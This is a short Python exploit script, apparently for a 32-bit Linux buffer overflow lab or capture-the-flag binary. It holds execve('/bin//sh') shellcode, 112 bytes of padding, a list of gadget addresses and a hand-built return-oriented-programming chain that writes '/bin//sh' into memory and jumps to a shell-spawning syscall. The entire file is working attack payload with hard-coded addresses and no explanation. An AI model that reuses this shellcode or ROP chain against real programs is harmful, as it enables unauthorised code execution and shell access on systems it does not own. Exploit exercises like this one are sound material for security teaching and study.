#!/usr/bin/python3
from struct import pack
#from shellcode import shellcode
import sys

# ROPGadget: Tool used for searching Return oriented code snippets.
# This tool lets you search your gadgets on your binaries to facilitate your ROP exploitation.

shellcode = b"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80"

shell_str = b"/bin//sh\x00"
padding = b"A"*112

0x0805f930
0x0806b9af
0x08098df7
0x08050b49
0x0805ae63
0x08087ef4
0x0804a4b2
sys.stdout.buffer.write( padding + b"\xf8\xeb\x05\x08" + b"/bin" + b"\xbc\x89\xfe\xff" +  b"AAAA" + b"\x32\xf9\x05\x08" + b"\xf8\xeb\x05\x08" + b"//sh" + b"\xc0\x89\xfe\xff" + b"AAAA" + b"\x32\xf9\x05\x08" + b"\xf8\xeb\x05\x08" + b"AAAA" + b"\xc4\x89\xfe\xff" + b"AAAA" + b"\xaf\xb9\x06\x08" + b"\x32\xf9\x05\x08"  + b"\x49\x0b\x05\x08" + b"\xbc\x89\xfe\xff" + b"A"*12 + b"\x63\xae\x05\x08" +b"\xbc\x89\xfe\xff"  + b"A"*12 +b"\xaf\xb9\x06\x08" + b"\xf4\x7e\x08\x08"*11 + b"\xb2\xa4\x04\x08")

